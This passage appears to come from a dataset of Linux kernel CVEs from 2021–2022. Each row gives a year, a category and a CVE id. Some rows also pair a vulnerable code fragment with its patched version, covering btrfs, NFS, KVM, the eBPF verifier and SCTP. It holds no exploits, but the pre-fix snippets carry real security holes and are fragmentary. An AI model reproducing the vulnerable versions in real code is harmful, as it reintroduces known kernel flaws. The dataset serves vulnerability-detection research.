		ret = btrfs_block_rsv_add(fs_info->chunk_root,
					  &fs_info->chunk_block_rsv,
					  thresh, BTRFS_RESERVE_NO_FLUSH);
 if (!ret) {
 atomic64_add(thresh, &cur_trans->chunk_bytes_reserved);
			trans->chunk_bytes_reserved += thresh;
		}
	}
}

void btrfs_trans_release_chunk_metadata(struct btrfs_trans_handle *trans)
{
 struct btrfs_fs_info *fs_info = trans->fs_info;
 struct btrfs_transaction *cur_trans = trans->transaction;

 if (!trans->chunk_bytes_reserved)
 return;

 btrfs_block_rsv_release(fs_info, &fs_info->chunk_block_rsv,
				trans->chunk_bytes_reserved, NULL);
 atomic64_sub(trans->chunk_bytes_reserved, &cur_trans->chunk_bytes_reserved);
 cond_wake_up(&cur_trans->chunk_reserve_wait);
	trans->chunk_bytes_reserved = 0;
}

 spin_lock_init(&cur_trans->dropped_roots_lock);
 INIT_LIST_HEAD(&cur_trans->releasing_ebs);
 spin_lock_init(&cur_trans->releasing_ebs_lock);
 atomic64_set(&cur_trans->chunk_bytes_reserved, 0);
 init_waitqueue_head(&cur_trans->chunk_reserve_wait);
 list_add_tail(&cur_trans->list, &fs_info->trans_list);
 extent_io_tree_init(fs_info, &cur_trans->dirty_pages,
			IO_TREE_TRANS_DIRTY_PAGES, fs_info->btree_inode);

 spinlock_t releasing_ebs_lock;
 struct list_head releasing_ebs;

 /*
	 * The number of bytes currently reserved, by all transaction handles
	 * attached to this transaction, for metadata extents of the chunk tree.
 */
 atomic64_t chunk_bytes_reserved;
 wait_queue_head_t chunk_reserve_wait;
};

#define __TRANS_FREEZABLE	(1U << 0)
"," */
void check_system_chunk(struct btrfs_trans_handle *trans, u64 type)
{

 struct btrfs_fs_info *fs_info = trans->fs_info;
 struct btrfs_space_info *info;
	u64 left;
 lockdep_assert_held(&fs_info->chunk_mutex);

	info = btrfs_find_space_info(fs_info, BTRFS_BLOCK_GROUP_SYSTEM);

 spin_lock(&info->lock);
	left = info->total_bytes - btrfs_space_info_used(info, true);
 spin_unlock(&info->lock);

 if (left < thresh) {
		u64 flags = btrfs_system_alloc_profile(fs_info);





















































 /*
		 * Ignore failure to create system chunk. We might end up not
		ret = btrfs_block_rsv_add(fs_info->chunk_root,
					  &fs_info->chunk_block_rsv,
					  thresh, BTRFS_RESERVE_NO_FLUSH);
 if (!ret)

			trans->chunk_bytes_reserved += thresh;

	}
}

void btrfs_trans_release_chunk_metadata(struct btrfs_trans_handle *trans)
{
 struct btrfs_fs_info *fs_info = trans->fs_info;


 if (!trans->chunk_bytes_reserved)
 return;

 btrfs_block_rsv_release(fs_info, &fs_info->chunk_block_rsv,
				trans->chunk_bytes_reserved, NULL);


	trans->chunk_bytes_reserved = 0;
}

 spin_lock_init(&cur_trans->dropped_roots_lock);
 INIT_LIST_HEAD(&cur_trans->releasing_ebs);
 spin_lock_init(&cur_trans->releasing_ebs_lock);


 list_add_tail(&cur_trans->list, &fs_info->trans_list);
 extent_io_tree_init(fs_info, &cur_trans->dirty_pages,
			IO_TREE_TRANS_DIRTY_PAGES, fs_info->btree_inode);

 spinlock_t releasing_ebs_lock;
 struct list_head releasing_ebs;







};

#define __TRANS_FREEZABLE	(1U << 0)
"
2021,DoS ,CVE-2021-38202,"		__entry->ino = ino;
		__entry->len = namlen;
 memcpy(__get_str(name), name, namlen);
 __assign_str(name, name);
	),
	TP_printk(""fh_hash=0x%08x ino=%llu name=%.*s"",
		__entry->fh_hash, __entry->ino,
","		__entry->ino = ino;
		__entry->len = namlen;
 memcpy(__get_str(name), name, namlen);

	),
	TP_printk(""fh_hash=0x%08x ino=%llu name=%.*s"",
		__entry->fh_hash, __entry->ino,
"
2021,DoS Overflow ,CVE-2021-38201," void *kaddr;

	maxlen = xdr->buf->page_len;
 if (base >= maxlen) {
		base = maxlen;
		maxlen = 0;
	} else
		maxlen -= base;
 if (len > maxlen)
		len = maxlen;
"," void *kaddr;

	maxlen = xdr->buf->page_len;
 if (base >= maxlen)
 return 0;
 else

		maxlen -= base;
 if (len > maxlen)
		len = maxlen;
"
2021,DoS ,CVE-2021-38200," bool use_siar = regs_use_siar(regs);
 unsigned long siar = mfspr(SPRN_SIAR);

 if (ppmu->flags & PPMU_P10_DD1) {
 if (siar)
 return siar;
 else
"," bool use_siar = regs_use_siar(regs);
 unsigned long siar = mfspr(SPRN_SIAR);

 if (ppmu && (ppmu->flags & PPMU_P10_DD1)) {
 if (siar)
 return siar;
 else
"
2021,DoS ,CVE-2021-38199,"
struct nfs_client *nfs4_alloc_client(const struct nfs_client_initdata *cl_init)
{
 int err;

 struct nfs_client *clp = nfs_alloc_client(cl_init);


 if (IS_ERR(clp))
 return clp;

 init_waitqueue_head(&clp->cl_lock_waitq);
#endif
 INIT_LIST_HEAD(&clp->pending_cb_stateids);






































 return clp;

error:
struct nfs_client *nfs4_init_client(struct nfs_client *clp,
 const struct nfs_client_initdata *cl_init)
{
 char buf[INET6_ADDRSTRLEN + 1];
 const char *ip_addr = cl_init->ip_addr;
 struct nfs_client *old;
 int error;

 if (clp->cl_cons_state == NFS_CS_READY)
 /* the client is initialised already */
 return clp;

 /* Check NFS protocol revision and initialize RPC op vector */
	clp->rpc_ops = &nfs_v4_clientops;

 if (clp->cl_minorversion != 0)
 __set_bit(NFS_CS_INFINITE_SLOTS, &clp->cl_flags);
 __set_bit(NFS_CS_DISCRTRY, &clp->cl_flags);
 __set_bit(NFS_CS_NO_RETRANS_TIMEOUT, &clp->cl_flags);

	error = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_GSS_KRB5I);
 if (error == -EINVAL)
		error = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_UNIX);
 if (error < 0)
 goto error;

 /* If no clientaddr= option was specified, find a usable cb address */
 if (ip_addr == NULL) {
 struct sockaddr_storage cb_addr;
 struct sockaddr *sap = (struct sockaddr *)&cb_addr;

		error = rpc_localaddr(clp->cl_rpcclient, sap, sizeof(cb_addr));
 if (error < 0)
 goto error;
		error = rpc_ntop(sap, buf, sizeof(buf));
 if (error < 0)
 goto error;
		ip_addr = (const char *)buf;
	}
 strlcpy(clp->cl_ipaddr, ip_addr, sizeof(clp->cl_ipaddr));

	error = nfs_idmap_new(clp);
 if (error < 0) {
 dprintk(""%s: failed to create idmapper. Error = %d\n"",
			__func__, error);
 goto error;
	}
 __set_bit(NFS_CS_IDMAP, &clp->cl_res_state);

	error = nfs4_init_client_minor_version(clp);
 if (error < 0)
 goto error;
","
struct nfs_client *nfs4_alloc_client(const struct nfs_client_initdata *cl_init)
{
 char buf[INET6_ADDRSTRLEN + 1];
 const char *ip_addr = cl_init->ip_addr;
 struct nfs_client *clp = nfs_alloc_client(cl_init);
 int err;

 if (IS_ERR(clp))
 return clp;

 init_waitqueue_head(&clp->cl_lock_waitq);
#endif
 INIT_LIST_HEAD(&clp->pending_cb_stateids);

 if (cl_init->minorversion != 0)
 __set_bit(NFS_CS_INFINITE_SLOTS, &clp->cl_flags);
 __set_bit(NFS_CS_DISCRTRY, &clp->cl_flags);
 __set_bit(NFS_CS_NO_RETRANS_TIMEOUT, &clp->cl_flags);

 /*
	 * Set up the connection to the server before we add add to the
	 * global list.
 */
	err = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_GSS_KRB5I);
 if (err == -EINVAL)
		err = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_UNIX);
 if (err < 0)
 goto error;

 /* If no clientaddr= option was specified, find a usable cb address */
 if (ip_addr == NULL) {
 struct sockaddr_storage cb_addr;
 struct sockaddr *sap = (struct sockaddr *)&cb_addr;

		err = rpc_localaddr(clp->cl_rpcclient, sap, sizeof(cb_addr));
 if (err < 0)
 goto error;
		err = rpc_ntop(sap, buf, sizeof(buf));
 if (err < 0)
 goto error;
		ip_addr = (const char *)buf;
	}
 strlcpy(clp->cl_ipaddr, ip_addr, sizeof(clp->cl_ipaddr));

	err = nfs_idmap_new(clp);
 if (err < 0) {
 dprintk(""%s: failed to create idmapper. Error = %d\n"",
			__func__, err);
 goto error;
	}
 __set_bit(NFS_CS_IDMAP, &clp->cl_res_state);
 return clp;

error:
struct nfs_client *nfs4_init_client(struct nfs_client *clp,
 const struct nfs_client_initdata *cl_init)
{


 struct nfs_client *old;
 int error;

 if (clp->cl_cons_state == NFS_CS_READY)
 /* the client is initialised already */
 return clp;






































	error = nfs4_init_client_minor_version(clp);
 if (error < 0)
 goto error;
"
2021,,CVE-2021-38198,"    shadow pages) so role.quadrant takes values in the range 0..3.  Each
    quadrant maps 1GB virtual address space.
  role.access:
    Inherited guest access permissions in the form uwx.  Note execute
    permission is positive, not negative.
  role.invalid:
    The page is invalid and should not be used.  It is a root page that is
    currently pinned (by a cpu hardware register pointing to it); once it is
 gpa_t pte_gpa[PT_MAX_FULL_LEVELS];
 pt_element_t __user *ptep_user[PT_MAX_FULL_LEVELS];
 bool pte_writable[PT_MAX_FULL_LEVELS];
 unsigned pt_access;
 unsigned pte_access;
 gfn_t gfn;
 struct x86_exception fault;
};
		}

		walker->ptes[walker->level - 1] = pte;



	} while (!is_last_gpte(mmu, walker->level, pte));

	pte_pkey = FNAME(gpte_pkeys)(vcpu, pte);
	accessed_dirty = have_ad ? pte_access & PT_GUEST_ACCESSED_MASK : 0;

 /* Convert to ACC_*_MASK flags for struct guest_walker.  */
	walker->pt_access = FNAME(gpte_access)(pt_access ^ walk_nx_mask);
	walker->pte_access = FNAME(gpte_access)(pte_access ^ walk_nx_mask);
	errcode = permission_fault(vcpu, mmu, walker->pte_access, pte_pkey, access);
 if (unlikely(errcode))
	}

 pgprintk(""%s: pte %llx pte_access %x pt_access %x\n"",
		 __func__, (u64)pte, walker->pte_access, walker->pt_access);

 return 1;

error:
 bool huge_page_disallowed = exec && nx_huge_page_workaround_enabled;
 struct kvm_mmu_page *sp = NULL;
 struct kvm_shadow_walk_iterator it;
 unsigned direct_access, access = gw->pt_access;
 int top_level, level, req_level, ret;
 gfn_t base_gfn = gw->gfn;

		sp = NULL;
 if (!is_shadow_present_pte(*it.sptep)) {
			table_gfn = gw->table_gfn[it.level - 2];

			sp = kvm_mmu_get_page(vcpu, table_gfn, addr, it.level-1,
 false, access);
		}
","    shadow pages) so role.quadrant takes values in the range 0..3.  Each
    quadrant maps 1GB virtual address space.
  role.access:
    Inherited guest access permissions from the parent ptes in the form uwx.
 Note execute permission is positive, not negative.
  role.invalid:
    The page is invalid and should not be used.  It is a root page that is
    currently pinned (by a cpu hardware register pointing to it); once it is
 gpa_t pte_gpa[PT_MAX_FULL_LEVELS];
 pt_element_t __user *ptep_user[PT_MAX_FULL_LEVELS];
 bool pte_writable[PT_MAX_FULL_LEVELS];
 unsigned int pt_access[PT_MAX_FULL_LEVELS];
 unsigned int pte_access;
 gfn_t gfn;
 struct x86_exception fault;
};
		}

		walker->ptes[walker->level - 1] = pte;

 /* Convert to ACC_*_MASK flags for struct guest_walker.  */
		walker->pt_access[walker->level - 1] = FNAME(gpte_access)(pt_access ^ walk_nx_mask);
	} while (!is_last_gpte(mmu, walker->level, pte));

	pte_pkey = FNAME(gpte_pkeys)(vcpu, pte);
	accessed_dirty = have_ad ? pte_access & PT_GUEST_ACCESSED_MASK : 0;

 /* Convert to ACC_*_MASK flags for struct guest_walker.  */

	walker->pte_access = FNAME(gpte_access)(pte_access ^ walk_nx_mask);
	errcode = permission_fault(vcpu, mmu, walker->pte_access, pte_pkey, access);
 if (unlikely(errcode))
	}

 pgprintk(""%s: pte %llx pte_access %x pt_access %x\n"",
		 __func__, (u64)pte, walker->pte_access,
		 walker->pt_access[walker->level - 1]);
 return 1;

error:
 bool huge_page_disallowed = exec && nx_huge_page_workaround_enabled;
 struct kvm_mmu_page *sp = NULL;
 struct kvm_shadow_walk_iterator it;
 unsigned int direct_access, access;
 int top_level, level, req_level, ret;
 gfn_t base_gfn = gw->gfn;

		sp = NULL;
 if (!is_shadow_present_pte(*it.sptep)) {
			table_gfn = gw->table_gfn[it.level - 2];
 access = gw->pt_access[it.level - 2];
			sp = kvm_mmu_get_page(vcpu, table_gfn, addr, it.level-1,
 false, access);
		}
"
2021,Overflow ,CVE-2021-38166,,
2021,,CVE-2021-38160,"
	buf = virtqueue_get_buf(port->in_vq, &len);
 if (buf) {
		buf->len = len;
		buf->offset = 0;
		port->stats.bytes_received += len;
	}
 while ((buf = virtqueue_get_buf(vq, &len))) {
 spin_unlock(&portdev->c_ivq_lock);

		buf->len = len;
		buf->offset = 0;

 handle_control_message(vq->vdev, portdev, buf);
","
	buf = virtqueue_get_buf(port->in_vq, &len);
 if (buf) {
		buf->len = min_t(size_t, len, buf->size);
		buf->offset = 0;
		port->stats.bytes_received += len;
	}
 while ((buf = virtqueue_get_buf(vq, &len))) {
 spin_unlock(&portdev->c_ivq_lock);

		buf->len = min_t(size_t, len, buf->size);
		buf->offset = 0;

 handle_control_message(vq->vdev, portdev, buf);
"
2021,Mem. Corr. ,CVE-2021-37576,,
2021,,CVE-2021-37159,,
2021,Bypass +Info ,CVE-2021-35477,,
2021,,CVE-2021-35039,"#endif
}


static bool sig_enforce = IS_ENABLED(CONFIG_MODULE_SIG_FORCE);
module_param(sig_enforce, bool_enable_only, 0644);









/*
 * Export sig_enforce kernel cmdline parameter to allow other subsystems rely
 * on that instead of directly to CONFIG_MODULE_SIG_FORCE config.
}
EXPORT_SYMBOL(is_module_sig_enforced);

void set_module_sig_enforced(void)
{
	sig_enforce = true;
}

/* Block module loading/unloading? */
int modules_disabled = 0;
core_param(nomodule, modules_disabled, bint, 0);
","#endif
}

#ifdef CONFIG_MODULE_SIG
static bool sig_enforce = IS_ENABLED(CONFIG_MODULE_SIG_FORCE);
module_param(sig_enforce, bool_enable_only, 0644);

void set_module_sig_enforced(void)
{
	sig_enforce = true;
}
#else
#define sig_enforce false
#endif

/*
 * Export sig_enforce kernel cmdline parameter to allow other subsystems rely
 * on that instead of directly to CONFIG_MODULE_SIG_FORCE config.
}
EXPORT_SYMBOL(is_module_sig_enforced);






/* Block module loading/unloading? */
int modules_disabled = 0;
core_param(nomodule, modules_disabled, bint, 0);
"
2022,Exec Code ,CVE-2021-34866,,
2021,#NAME?,CVE-2021-34693,,
2021,Bypass +Info ,CVE-2021-34556,,
2021,Overflow ,CVE-2021-33909,"
static void *seq_buf_alloc(unsigned long size)
{



 return kvmalloc(size, GFP_KERNEL_ACCOUNT);
}

","
static void *seq_buf_alloc(unsigned long size)
{
 if (unlikely(size > MAX_RW_COUNT))
 return NULL;

 return kvmalloc(size, GFP_KERNEL_ACCOUNT);
}

"
2021,,CVE-2021-33624," bool mask_to_left;
};






















static int sanitize_ptr_alu(struct bpf_verifier_env *env,
 struct bpf_insn *insn,
 const struct bpf_reg_state *ptr_reg,
		tmp = *dst_reg;
		*dst_reg = *ptr_reg;
	}
	ret = push_stack(env, env->insn_idx + 1, env->insn_idx, true);

 if (!ptr_is_dst_reg && ret)
		*dst_reg = tmp;
 return !ret ? REASON_STACK : 0;
 if (err)
 return err;
	}

 if (pred == 1) {
 /* only follow the goto, ignore fall-through */







		*insn_idx += insn->off;
 return 0;
	} else if (pred == 0) {
 /* only follow fall-through branch, since
		 * that's where the program will go

 */





 return 0;
	}

"," bool mask_to_left;
};

static struct bpf_verifier_state *
sanitize_speculative_path(struct bpf_verifier_env *env,
 const struct bpf_insn *insn,
			  u32 next_idx, u32 curr_idx)
{
 struct bpf_verifier_state *branch;
 struct bpf_reg_state *regs;

	branch = push_stack(env, next_idx, curr_idx, true);
 if (branch && insn) {
		regs = branch->frame[branch->curframe]->regs;
 if (BPF_SRC(insn->code) == BPF_K) {
 mark_reg_unknown(env, regs, insn->dst_reg);
		} else if (BPF_SRC(insn->code) == BPF_X) {
 mark_reg_unknown(env, regs, insn->dst_reg);
 mark_reg_unknown(env, regs, insn->src_reg);
		}
	}
 return branch;
}

static int sanitize_ptr_alu(struct bpf_verifier_env *env,
 struct bpf_insn *insn,
 const struct bpf_reg_state *ptr_reg,
		tmp = *dst_reg;
		*dst_reg = *ptr_reg;
	}
	ret = sanitize_speculative_path(env, NULL, env->insn_idx + 1,
					env->insn_idx);
 if (!ptr_is_dst_reg && ret)
		*dst_reg = tmp;
 return !ret ? REASON_STACK : 0;
 if (err)
 return err;
	}

 if (pred == 1) {
 /* Only follow the goto, ignore fall-through. If needed, push
		 * the fall-through branch for simulation under speculative
		 * execution.
 */
 if (!env->bypass_spec_v1 &&
		    !sanitize_speculative_path(env, insn, *insn_idx + 1,
					       *insn_idx))
 return -EFAULT;
		*insn_idx += insn->off;
 return 0;
	} else if (pred == 0) {
 /* Only follow the fall-through branch, since that's where the
		 * program will go. If needed, push the goto branch for
		 * simulation under speculative execution.
 */
 if (!env->bypass_spec_v1 &&
		    !sanitize_speculative_path(env, insn,
					       *insn_idx + insn->off + 1,
					       *insn_idx))
 return -EFAULT;
 return 0;
	}

"
2021,,CVE-2021-33200,,
2021,,CVE-2021-33034,,
2021,,CVE-2021-33033,,
2021,,CVE-2021-32606,,
2021,,CVE-2021-32399,"{
 int ret;

 if (!test_bit(HCI_UP, &hdev->flags))
 return -ENETDOWN;

 /* Serialize all requests */
 hci_req_sync_lock(hdev);
	ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);







 hci_req_sync_unlock(hdev);

 return ret;
","{
 int ret;




 /* Serialize all requests */
 hci_req_sync_lock(hdev);
 /* check the state after obtaing the lock to protect the HCI_UP
	 * against any races from hci_dev_do_close when the controller
	 * gets removed.
 */
 if (test_bit(HCI_UP, &hdev->flags))
		ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);
 else
		ret = -ENETDOWN;
 hci_req_sync_unlock(hdev);

 return ret;
"
2021,,CVE-2021-32078,"CONFIG_MODULES=y
CONFIG_ARCH_FOOTBRIDGE=y
CONFIG_ARCH_CATS=y
CONFIG_ARCH_PERSONAL_SERVER=y
CONFIG_ARCH_EBSA285_HOST=y
CONFIG_ARCH_NETWINDER=y
CONFIG_LEDS=y

	  Saying N will reduce the size of the Footbridge kernel.

config ARCH_PERSONAL_SERVER
	bool ""Compaq Personal Server""
	select FOOTBRIDGE_HOST
	select ISA
	select ISA_DMA
	select FORCE_PCI
	help
	  Say Y here if you intend to run this kernel on the Compaq
	  Personal Server.

	  Saying N will reduce the size of the Footbridge kernel.

	  The Compaq Personal Server is not available for purchase.
	  There are no product plans beyond the current research
	  prototypes at this time.  Information is available at:

	  <http://www.crl.hpl.hp.com/projects/personalserver/>

	  If you have any questions or comments about the  Compaq Personal
	  Server, send e-mail to <skiff@crl.dec.com>.

config ARCH_EBSA285_ADDIN
	bool ""EBSA285 (addin mode)""
	select ARCH_EBSA285
pci-$(CONFIG_ARCH_CATS) += cats-pci.o
pci-$(CONFIG_ARCH_EBSA285_HOST) += ebsa285-pci.o
pci-$(CONFIG_ARCH_NETWINDER) += netwinder-pci.o
pci-$(CONFIG_ARCH_PERSONAL_SERVER) += personal-pci.o

obj-$(CONFIG_ARCH_CATS) += cats-hw.o isa-timer.o
obj-$(CONFIG_ARCH_EBSA285) += ebsa285.o dc21285-timer.o
obj-$(CONFIG_ARCH_NETWINDER) += netwinder-hw.o isa-timer.o
obj-$(CONFIG_ARCH_PERSONAL_SERVER) += personal.o dc21285-timer.o

obj-$(CONFIG_PCI)	+=$(pci-y)

","CONFIG_MODULES=y
CONFIG_ARCH_FOOTBRIDGE=y
CONFIG_ARCH_CATS=y

CONFIG_ARCH_EBSA285_HOST=y
CONFIG_ARCH_NETWINDER=y
CONFIG_LEDS=y

	  Saying N will reduce the size of the Footbridge kernel.






















config ARCH_EBSA285_ADDIN
	bool ""EBSA285 (addin mode)""
	select ARCH_EBSA285
pci-$(CONFIG_ARCH_CATS) += cats-pci.o
pci-$(CONFIG_ARCH_EBSA285_HOST) += ebsa285-pci.o
pci-$(CONFIG_ARCH_NETWINDER) += netwinder-pci.o


obj-$(CONFIG_ARCH_CATS) += cats-hw.o isa-timer.o
obj-$(CONFIG_ARCH_EBSA285) += ebsa285.o dc21285-timer.o
obj-$(CONFIG_ARCH_NETWINDER) += netwinder-hw.o isa-timer.o


obj-$(CONFIG_PCI)	+=$(pci-y)

"
2021,#NAME?,CVE-2021-31916,"	 * Grab our output buffer.
 */
	nl = orig_nl = get_result_buffer(param, param_size, &len);
 if (len < needed) {
		param->flags |= DM_BUFFER_FULL_FLAG;
 goto out;
	}
","	 * Grab our output buffer.
 */
	nl = orig_nl = get_result_buffer(param, param_size, &len);
 if (len < needed || len < sizeof(nl->dev)) {
		param->flags |= DM_BUFFER_FULL_FLAG;
 goto out;
	}
"
2021,,CVE-2021-31829,"};

/* Possible states for alu_state member. */
#define BPF_ALU_SANITIZE_SRC 1U
#define BPF_ALU_SANITIZE_DST 2U
#define BPF_ALU_NEG_VALUE		(1U << 2)
#define BPF_ALU_NON_POINTER		(1U << 3)

#define BPF_ALU_SANITIZE		(BPF_ALU_SANITIZE_SRC | \
					 BPF_ALU_SANITIZE_DST)

{
 struct bpf_insn_aux_data *aux = commit_window ? cur_aux(env) : tmp_aux;
 struct bpf_verifier_state *vstate = env->cur_state;

 bool off_is_neg = off_reg->smin_value < 0;
 bool ptr_is_dst_reg = ptr_reg == dst_reg;
	u8 opcode = BPF_OP(insn->code);
		alu_limit = abs(tmp_aux->alu_limit - alu_limit);
	} else {
		alu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : 0;

		alu_state |= ptr_is_dst_reg ?
			     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;
	}
 const u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;
 const u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;
 struct bpf_insn *patch = &insn_buf[0];
 bool issrc, isneg;
			u32 off_reg;

			aux = &env->insn_aux_data[i + delta];
			isneg = aux->alu_state & BPF_ALU_NEG_VALUE;
			issrc = (aux->alu_state & BPF_ALU_SANITIZE) ==
				BPF_ALU_SANITIZE_SRC;


			off_reg = issrc ? insn->src_reg : insn->dst_reg;
 if (isneg)
				*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);
			*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);
			*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);
			*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);
			*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);
			*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);
			*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);




 if (!issrc)
				*patch++ = BPF_MOV64_REG(insn->dst_reg, insn->src_reg);
			insn->src_reg = BPF_REG_AX;
 if (isneg)
				insn->code = insn->code == code_add ?
					     code_sub : code_add;
			*patch++ = *insn;
 if (issrc && isneg)
				*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);
			cnt = patch - insn_buf;

","};

/* Possible states for alu_state member. */
#define BPF_ALU_SANITIZE_SRC (1U << 0)
#define BPF_ALU_SANITIZE_DST (1U << 1)
#define BPF_ALU_NEG_VALUE		(1U << 2)
#define BPF_ALU_NON_POINTER		(1U << 3)
#define BPF_ALU_IMMEDIATE		(1U << 4)
#define BPF_ALU_SANITIZE		(BPF_ALU_SANITIZE_SRC | \
					 BPF_ALU_SANITIZE_DST)

{
 struct bpf_insn_aux_data *aux = commit_window ? cur_aux(env) : tmp_aux;
 struct bpf_verifier_state *vstate = env->cur_state;
 bool off_is_imm = tnum_is_const(off_reg->var_off);
 bool off_is_neg = off_reg->smin_value < 0;
 bool ptr_is_dst_reg = ptr_reg == dst_reg;
	u8 opcode = BPF_OP(insn->code);
		alu_limit = abs(tmp_aux->alu_limit - alu_limit);
	} else {
		alu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : 0;
		alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : 0;
		alu_state |= ptr_is_dst_reg ?
			     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;
	}
 const u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;
 const u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;
 struct bpf_insn *patch = &insn_buf[0];
 bool issrc, isneg, isimm;
			u32 off_reg;

			aux = &env->insn_aux_data[i + delta];
			isneg = aux->alu_state & BPF_ALU_NEG_VALUE;
			issrc = (aux->alu_state & BPF_ALU_SANITIZE) ==
				BPF_ALU_SANITIZE_SRC;
			isimm = aux->alu_state & BPF_ALU_IMMEDIATE;

			off_reg = issrc ? insn->src_reg : insn->dst_reg;
 if (isimm) {
				*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);
			} else {
 if (isneg)
					*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);
				*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);
				*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);
				*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);
				*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);
				*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);
				*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);
			}
 if (!issrc)
				*patch++ = BPF_MOV64_REG(insn->dst_reg, insn->src_reg);
			insn->src_reg = BPF_REG_AX;
 if (isneg)
				insn->code = insn->code == code_add ?
					     code_sub : code_add;
			*patch++ = *insn;
 if (issrc && isneg && !isimm)
				*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);
			cnt = patch - insn_buf;

"
2021,Exec Code ,CVE-2021-31440,,
2021,,CVE-2021-30178,,
2021,,CVE-2021-30002,,
2021,Bypass ,CVE-2021-29657,,
2021,DoS ,CVE-2021-29650,,
2021,,CVE-2021-29649,,
2021,,CVE-2021-29648,,
2021,#NAME?,CVE-2021-29647,,
2021,,CVE-2021-29646,,
2021,,CVE-2021-29266,,
2021,DoS ,CVE-2021-29265,,
2021,,CVE-2021-29264,,
2021,#NAME?,CVE-2021-29155,,
2021,Exec Code ,CVE-2021-29154,,
2021,Overflow ,CVE-2021-28972,,
2021,,CVE-2021-28971,,
2021,DoS ,CVE-2021-28964,,
2021,Overflow ,CVE-2021-28952,,
2021,DoS ,CVE-2021-28951,,
2021,,CVE-2021-28950,,
2022,Bypass ,CVE-2021-28715,,
2022,Bypass ,CVE-2021-28714,,
2021,,CVE-2021-28691,,
2021,,CVE-2021-28688,,
2021,,CVE-2021-28660,,
2021,,CVE-2021-28375,,
2021,,CVE-2021-28039,,
2021,DoS ,CVE-2021-28038,,
2021,,CVE-2021-27365,,
2021,,CVE-2021-27364,,
2021,,CVE-2021-27363,,
2021,,CVE-2021-26934,,
2021,,CVE-2021-26932,,
2021,,CVE-2021-26931,,
2021,,CVE-2021-26930,,
2021,,CVE-2021-26708,,
2021,,CVE-2021-23134,,
2021,,CVE-2021-23133,,
2022,,CVE-2021-22600,,
2021,#NAME?,CVE-2021-22555,,
2021,Overflow Bypass ,CVE-2021-22543,,
2021,#NAME?,CVE-2021-21781,,
2022,Bypass ,CVE-2021-20322,,
2022,,CVE-2021-20321,,
2022,#NAME?,CVE-2021-20320,,
2021,DoS ,CVE-2021-20317,,
2021,Exec Code ,CVE-2021-20292,,
2021,,CVE-2021-20268,,
2021,,CVE-2021-20265,,
2021,,CVE-2021-20261,,
2021,#NAME?,CVE-2021-20239,,
2021,DoS ,CVE-2021-20226,,
2021,DoS ,CVE-2021-20219,,
2021,Overflow ,CVE-2021-20194,,
2021,,CVE-2021-20177,,
2022,,CVE-2021-4202,,
2022,Overflow ,CVE-2021-4157,,
2022,DoS ,CVE-2021-4154,,
2022,DoS ,CVE-2021-4149,,
2022,DoS ,CVE-2021-4148,,
2022,DoS ,CVE-2021-4095,,
2022,,CVE-2021-4093,,
2022,#NAME?,CVE-2021-4090,,
2022,,CVE-2021-4083,,
2022,DoS ,CVE-2021-4032,,
2022,,CVE-2021-4023,,
2022,,CVE-2021-4002,,
2022,,CVE-2021-4001,,
2022,,CVE-2021-3773,,
2022,,CVE-2021-3772," void *arg,
 struct sctp_cmd_seq *commands);







/* Small helper function that checks if the chunk length
 * is of the appropriate length.  The 'required_length' argument
 * is set to be the size of a specific chunk we are testing.
 if (!chunk->singleton)
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);









 /* If the packet is an OOTB packet which is temporarily on the
	 * control endpoint, respond with an ABORT.
 */
 if (chunk->sctp_hdr->vtag != 0)
 return sctp_sf_tabort_8_4_8(net, ep, asoc, type, arg, commands);

 /* Make sure that the INIT chunk has a valid length.
	 * Normally, this would cause an ABORT with a Protocol Violation
	 * error, but since we don't have an association, we'll
	 * just discard the packet.
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_init_chunk)))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);

 /* If the INIT is coming toward a closing socket, we'll send back
	 * and ABORT.  Essentially, this catches the race of INIT being
	 * backloged to the socket at the same time as the user issues close().
 struct sock *sk;
 int error = 0;




 /* If the packet is an OOTB packet which is temporarily on the
	 * control endpoint, respond with an ABORT.
 */
	 * in sctp_unpack_cookie().
 */
 if (!sctp_chunk_length_valid(chunk, sizeof(struct sctp_chunkhdr)))
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);


 /* If the endpoint is not listening or if the number of associations
	 * on the TCP-style socket exceed the max backlog, respond with an
 if (!chunk->singleton)
 return sctp_sf_pdiscard(net, ep, asoc, type, arg, commands);





 /* 3.1 A packet containing an INIT chunk MUST have a zero Verification
	 * Tag.
 */
 if (chunk->sctp_hdr->vtag != 0)
